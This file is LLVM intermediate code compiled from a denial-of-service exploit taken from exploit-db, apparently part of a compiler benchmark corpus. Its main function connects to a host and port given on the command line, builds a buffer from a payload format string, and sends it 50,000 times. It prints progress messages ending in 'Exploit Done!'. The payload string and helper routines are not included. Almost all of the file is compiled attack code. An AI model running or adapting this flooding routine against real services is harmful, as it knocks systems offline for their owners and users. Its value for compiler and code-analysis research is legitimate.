; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1422.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1422.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.junk_data = private unnamed_addr constant [25 x i8] c"DoS-JUNK-DATA.:(CVH):.\0D\0A\00", align 16
@.str = private unnamed_addr constant [31 x i8] c"[r] Connecting to remote host\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"[r] Creating buffer\0A\00", align 1
@POCSTR = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [36 x i8] c"[r] Sending %d bytes of DOS buffer\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"[e] Failed to send buffer\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"[s] Exploit Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca [25 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = bitcast [25 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([25 x i8], [25 x i8]* @__const.main.junk_data, i32 0, i32 0), i64 25, i1 false)
  %11 = call i32 (...) @header()
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @usage(i8* %17)
  br label %19

19:                                               ; preds = %14, %2
  %20 = call i64 @malloc(i32 1024)
  %21 = inttoptr i64 %20 to i8*
  store i8* %21, i8** %8, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  %30 = call i32 @remote_connect(i8* %25, i32 %29)
  store i32 %30, i32* %6, align 4
  %31 = call i32 @sleep(i32 1)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i8*, i8** %8, align 8
  %34 = load i8*, i8** @POCSTR, align 8
  %35 = getelementptr inbounds [25 x i8], [25 x i8]* %9, i64 0, i64 0
  %36 = call i32 @sprintf(i8* %33, i8* %34, i8* %35)
  %37 = load i8*, i8** %8, align 8
  %38 = call i32 @strlen(i8* %37)
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i32 %38)
  store i32 0, i32* %7, align 4
  br label %40

40:                                               ; preds = %56, %19
  %41 = load i32, i32* %7, align 4
  %42 = icmp slt i32 %41, 50000
  br i1 %42, label %43, label %59

43:                                               ; preds = %40
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %8, align 8
  %46 = load i8*, i8** %8, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = call i64 @send(i32 %44, i8* %45, i32 %47, i32 0)
  %49 = icmp sle i64 %48, 0
  br i1 %49, label %50, label %55

50:                                               ; preds = %43
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %52 = load i32, i32* %6, align 4
  %53 = call i32 @close(i32 %52)
  %54 = call i32 @exit(i32 1) #4
  unreachable

55:                                               ; preds = %43
  br label %56

56:                                               ; preds = %55
  %57 = load i32, i32* %7, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %7, align 4
  br label %40

59:                                               ; preds = %40
  %60 = call i32 @sleep(i32 1)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %62 = load i32, i32* %6, align 4
  %63 = call i32 @close(i32 %62)
  %64 = load i8*, i8** %8, align 8
  %65 = call i32 @free(i8* %64)
  store i8* null, i8** %8, align 8
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @header(...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @remote_connect(i8*, i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
